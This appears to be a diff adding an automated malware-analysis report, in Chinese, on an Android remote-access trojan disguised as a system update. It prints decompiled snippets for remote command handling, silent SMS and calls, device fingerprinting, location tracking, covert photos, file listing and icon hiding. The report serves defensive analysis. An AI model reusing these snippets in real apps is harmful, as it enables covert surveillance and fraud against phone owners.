@@ -1,0 +1,262 @@
+{
+  "APK信息": {
+    "文件名": "93c183965f0e88927c852aeaf56073ecaca8060472ddf5373f5278449d96f1cd.apk",
+    "sha256": "93c183965f0e88927c852aeaf56073ecaca8060472ddf5373f5278449d96f1cd",
+    "包名": "com.update.systemac",
+    "应用名": "SystemAC",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 259.3
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "command"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\update\\systemac\\a\\b;",
+          "method_signature": "a(Bundle bundle)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public void a(Bundle bundle) {\n    try {\n        this.i.a(bundle.getShort(\"command\"), bundle.getByteArray(\"arguments\"), bundle.getInt(\"chan\"));\n    } catch (Exception e) {\n        b(\"Error on Client:\" + e.getMessage());\n    }\n}",
+          "malicious_code_snippet_context": "          this.b.a(i, bArr);\n      }\n  \n>>>     public void a(Bundle bundle) {\n>>>         try {\n>>>             this.i.a(bundle.getShort(\"command\"), bundle.getByteArray(\"arguments\"), bundle.getInt(\"chan\"));\n>>>         } catch (Exception e) {\n>>>             b(\"Error on Client:\" + e.getMessage());\n>>>         }\n>>>     }\n  \n      @Override // com.update.systemac.c.c\n      public void a(com.update.systemac.c.h hVar, String str) {",
+          "behavior_description": "该代码是C2远程控制的命令分发器。从远程服务器下发的消息Bundle中提取command（命令编号）、arguments（命令参数字节数组）和chan（通信通道号），然后调用内部命令处理器this.i.a()执行远程指令，实现攻击者对受感染设备的远程控制。类路径伪装为系统更新，属于典型远控木马架构。数据流向：远程C2服务器消息→Bundle（command/arguments/chan）→命令分发执行器this.i.a()。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\update\\systemac\\a\\f;",
+          "method_signature": "if(str6.getBytes()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "HashMap mapA = com.update.systemac.b.b.a(this.d.array());\nString str5 = (String) mapA.get(\"number\");\nString str6 = (String) mapA.get(\"body\");\nif (str6.getBytes().length < 167) {\n    SmsManager.getDefault().sendTextMessage(str5, null, str6, null, null);\n} else {\n    SmsManager.getDefault().sendMultipartTextMessage(str5, null, a(str6), null, null);\n}\nthis.b.a(\"SMS sent\");",
+          "malicious_code_snippet_context": "          }\n          if (this.a == com.update.systemac.c.g.r) {\n              this.l = null;\n>>>             HashMap mapA = com.update.systemac.b.b.a(this.d.array());\n>>>             String str5 = (String) mapA.get(\"number\");\n>>>             String str6 = (String) mapA.get(\"body\");\n>>>             if (str6.getBytes().length < 167) {\n>>>                 SmsManager.getDefault().sendTextMessage(str5, null, str6, null, null);\n>>>             } else {\n>>>                 SmsManager.getDefault().sendMultipartTextMessage(str5, null, a(str6), null, null);\n>>>             }\n>>>             this.b.a(\"SMS sent\");\n              return;\n          }\n          if (this.a == com.update.systemac.c.g.q) {",
+          "behavior_description": "该代码是远程控制木马的指令处理逻辑。程序从C2服务器下发的指令数据（this.d.array()，经com.update.systemac.b.b.a()解析）中提取目标号码number和短信内容body，随后在无任何用户交互的情况下静默调用SmsManager.sendTextMessage()发送短信；当内容超过167字节时改用sendMultipartTextMessage()分段发送。发送完成后通过this.b.a(\"SMS sent\")向C2服务器回传执行结果确认。数据流向为：网络C2指令数据→解析number/body→静默发送短信→回执上报。攻击者可借此远程控制受害手机向增值服务号码发送订阅短信或传播垃圾短信，直接造成用户话费损失，属于典型的短信欺诈行为。此外同段代码还包含静默拨打电话（ACTION_CALL）的指令处理，进一步印证其远程控制木马属性。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\update\\systemac\\d\\q;",
+          "method_signature": "b()",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "TelephonyManager telephonyManager = (TelephonyManager) this.b.getSystemService(\"phone\");\nthis.d.b(telephonyManager.getLine1Number());\nthis.d.c(telephonyManager.getDeviceId());\nthis.d.d(telephonyManager.getDeviceSoftwareVersion());\nthis.d.e(telephonyManager.getNetworkCountryIso());\nthis.d.f(telephonyManager.getNetworkOperator());\nthis.d.g(telephonyManager.getNetworkOperatorName());\nthis.d.h(telephonyManager.getSimOperator());\nthis.d.i(telephonyManager.getSimOperatorName());\nthis.d.a(telephonyManager.getSimCountryIso());\nthis.d.j(telephonyManager.getSimSerialNumber());",
+          "malicious_code_snippet_context": "      }\n  \n      public void b() {\n>>>         TelephonyManager telephonyManager = (TelephonyManager) this.b.getSystemService(\"phone\");\n>>>         this.d.b(telephonyManager.getLine1Number());\n>>>         this.d.c(telephonyManager.getDeviceId());\n>>>         this.d.d(telephonyManager.getDeviceSoftwareVersion());\n>>>         this.d.e(telephonyManager.getNetworkCountryIso());\n>>>         this.d.f(telephonyManager.getNetworkOperator());\n>>>         this.d.g(telephonyManager.getNetworkOperatorName());\n>>>         this.d.h(telephonyManager.getSimOperator());\n>>>         this.d.i(telephonyManager.getSimOperatorName());\n>>>         this.d.a(telephonyManager.getSimCountryIso());\n>>>         this.d.j(telephonyManager.getSimSerialNumber());\n      }\n  \n      public void c() {",
+          "behavior_description": "该方法通过 TelephonyManager(\"phone\") 系统服务批量采集设备敏感标识信息：手机号码（getLine1Number）、设备IMEI（getDeviceId）、软件版本、网络国家码、网络运营商及名称、SIM运营商及名称、SIM国家码、SIM卡序列号（getSimSerialNumber），并将全部数据逐一写入数据收集器对象 this.d 中聚合，构建完整设备指纹。数据流向为：TelephonyManager 敏感API（source）→ this.d 收集器字段存储/聚合（sink，供后续上报C2使用）。该类位于伪装成系统更新的恶意包 com.update.systemac 中，属于典型的恶意样本设备指纹采集与隐私窃取前置行为，可对感染设备进行唯一标识追踪。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "location_tracking",
+      "中文名": "位置追踪",
+      "MITRE": "T1430",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.ACCESS_FINE_LOCATION"
+        ],
+        "字符串": [
+          "requestLocationUpdates"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\update\\systemac\\d\\k;",
+          "method_signature": "k(LocationListener locationListener, String str, int i)",
+          "malicious_behavior": "location_tracking",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.b = (LocationManager) ((Context) locationListener).getSystemService(\"location\");\nthis.b.requestLocationUpdates(str, 0L, 0.0f, this.c);\nthis.e = new com.update.systemac.e.h(location.getLatitude(), location.getLongitude(), location.getAltitude(), location.getSpeed(), location.getAccuracy());",
+          "malicious_code_snippet_context": "          this.c = locationListener;\n          this.a = str;\n          this.d = i;\n>>>         this.b = (LocationManager) ((Context) locationListener).getSystemService(\"location\");\n>>>         this.b.requestLocationUpdates(str, 0L, 0.0f, this.c);\n>>>     }\n  \n      public void a() {\n          if (this.b != null) {",
+          "behavior_description": "该代码在构造函数中获取 LocationManager 系统服务，并以最小时间间隔(0ms)和最小距离(0.0米)调用 requestLocationUpdates 注册位置监听，即以最高频率持续获取用户实时位置；随后在 a(Location) 方法中提取经度、纬度、海拔、速度、精度等完整精确位置信息，封装进自定义类 com.update.systemac.e.h 并序列化为 byte[] 以便后续回传，实现对用户位置的隐蔽持续追踪。该类位于伪装成系统更新的恶意包 com.update.systemac 中，属无用户感知的隐私窃取行为。数据流向：GPS/网络定位提供程序(requestLocationUpdates 回调) → getLatitude()/getLongitude()/getAltitude()/getSpeed()/getAccuracy() 提取原始位置数据 → 封装序列化为 byte[] 待外传。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.CAMERA"
+        ],
+        "字符串": [
+          "takePicture"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\update\\systemac\\d\\l;",
+          "method_signature": "if(this.a == null)",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.a = Camera.open();\nthis.d = new SurfaceView(this.b).getHolder();\nthis.a.setPreviewDisplay(this.d);\nthis.a.startPreview();\nthis.a.takePicture(null, null, this.e);",
+          "malicious_code_snippet_context": "          }\n          Log.i(\"PhotoTaker\", \"Just before Open !\");\n          try {\n>>>             this.a = Camera.open();\n>>>             Log.i(\"PhotoTaker\", \"Right after Open !\");\n>>>             if (this.a == null) {\n>>>                 return false;\n>>>             }\n              try {\n                  this.d = new SurfaceView(this.b).getHolder();\n                  this.a.setPreviewDisplay(this.d);",
+          "behavior_description": "该代码在后台静默调用 Camera.open() 打开设备摄像头（无任何用户界面提示），通过 SurfaceView 获取 Holder 并设置为预览表面，调用 startPreview() 启动预览后，立即调用 takePicture() 拍摄照片，图像数据通过回调 this.e（PictureCallback，通常为 JPEG 回调）接收。数据流向为：摄像头硬件→takePicture() 静默拍照→回调获取图像字节数据，属于典型的间谍软件偷拍行为，结合该样本已确认为恶意软件，拍摄的照片极可能被窃取并上传至远程服务器，直接造成用户隐私泄露。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\update\\systemac\\a\\f;",
+          "method_signature": "if(this.a == com.update.systemac.c.g.q)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.e = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + new String(this.d.array())));\nthis.e.setFlags(268435456);\nthis.b.startActivity(this.e);",
+          "malicious_code_snippet_context": "          }\n          if (this.a == com.update.systemac.c.g.q) {\n              this.l = null;\n>>>             this.e = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + new String(this.d.array())));\n>>>             this.e.setFlags(268435456);\n>>>             this.b.startActivity(this.e);\n              return;\n          }\n          if (this.a == com.update.systemac.c.g.n) {",
+          "behavior_description": "该代码是远程控制命令分发器的一部分：通过比较命令标识 this.a 与常量 com.update.systemac.c.g.q 判断指令类型，当匹配时从命令数据缓冲区 this.d.array() 中取出电话号码（该号码来源于C2服务器下发的指令载荷），拼接成 tel: URI 并构造 ACTION_CALL Intent（注意是 ACTION_CALL 而非 ACTION_DIAL，可直接发起拨号无需用户在拨号界面确认），设置 FLAG_ACTIVITY_NEW_TASK 后调用 startActivity() 静默拨打电话。同一方法中还包含 SmsManager.sendTextMessage 静默发短信、读取短信列表等指令分支，构成完整的远程指令处理逻辑，属于典型的短信/电话木马行为，攻击者可远程操控受害手机拨打高费率号码造成用户话费损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "file_access",
+      "中文名": "文件访问/窃取",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_EXTERNAL_STORAGE",
+          "android.permission.WRITE_EXTERNAL_STORAGE"
+        ],
+        "字符串": [
+          "listFiles",
+          "getExternalStorageDirectory"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\update\\systemac\\a\\f;",
+          "method_signature": "if(!file2.exists()",
+          "malicious_behavior": "file_access",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (this.a == com.update.systemac.c.g.o) {\n    String str3 = new String(this.d.array());\n    if (str3.equalsIgnoreCase(\"ext\")) {\n        File file2 = new File(\"/storage\");\n        if (!file2.exists()) {\n            file2 = new File(\"/mnt\");\n        }\n        File[] fileArrListFiles = file2.listFiles(new g(this));\n        while (i2 < length) {\n            this.b.a(fileArrListFiles[i2].getAbsolutePath());\n            i2++;\n        }\n    }\n}",
+          "malicious_code_snippet_context": "              }\n              return;\n          }\n>>>         if (this.a == com.update.systemac.c.g.o) {\n>>>             this.l = null;\n>>>             this.b.a(\"List directory request received\");\n>>>             String str3 = new String(this.d.array());\n>>>             if (str3.equalsIgnoreCase(\"ext\")) {\n>>>                 File file2 = new File(\"/storage\");\n>>>                 if (!file2.exists()) {\n>>>                     file2 = new File(\"/mnt\");\n>>>                 }\n>>>                 try {\n>>>                     File[] fileArrListFiles = file2.listFiles(new g(this));\n>>>                     int length = fileArrListFiles.length;\n>>>                     while (i2 < length) {\n>>>                         try {\n                              this.b.a(fileArrListFiles[i2].getAbsolutePath());\n                          } catch (Exception e4) {\n                          }",
+          "behavior_description": "该代码是远程控制木马(RAT)的指令处理逻辑。恶意软件通过socket缓冲区(this.d.array())接收C2服务器下发的指令，当指令类型为'List directory request'且参数为'ext'时，枚举设备外部存储目录(/storage，不存在则回退到/mnt)下的文件列表，并通过this.b.a()将每个文件的绝对路径逐条回传给远程服务器。数据流向：远程C2指令→本地文件系统枚举→文件路径泄露回传。这使攻击者能够远程侦察受害者设备上的文件结构，为后续定向窃取文件（如照片、文档）做准备，属于典型的远程控制+隐私窃取前置行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\update\\systemac\\a;",
+          "method_signature": "onClick(View view)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "this.a.getPackageManager().setComponentEnabledSetting(new ComponentName(\"com.update.systemac.android\", \"com.update.systemac.android.updater\"), 2, 1); Intent intent = new Intent(\"android.intent.action.MAIN\"); intent.addCategory(\"android.intent.category.HOME\"); this.a.startActivity(intent);",
+          "malicious_code_snippet_context": "              e.printStackTrace();\n          }\n          try {\n>>>             this.a.getPackageManager().setComponentEnabledSetting(new ComponentName(\"com.update.systemac.android\", \"com.update.systemac.android.updater\"), 2, 1);\n          } catch (Exception e2) {\n          }\n          try {",
+          "behavior_description": "用户点击按钮后，应用先启动后台服务并展示伪装界面，随后休眠5秒，然后调用 PackageManager.setComponentEnabledSetting() 将自身的启动器组件（com.update.systemac.android.updater，即入口 Activity）设置为禁用状态（参数2 = COMPONENT_ENABLED_STATE_DISABLED），使应用图标从桌面启动器中消失；最后通过携带 HOME category 的 Intent 将用户送回桌面，让用户误以为操作已结束。数据流向：硬编码的包名/组件名 → setComponentEnabledSetting() 禁用 launcher 组件 → 图标隐藏，逃避用户察觉与卸载，属于典型的恶意软件隐匿驻留手法（常见于 FakeInst 类伪装安装器/更新器的恶意家族）",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
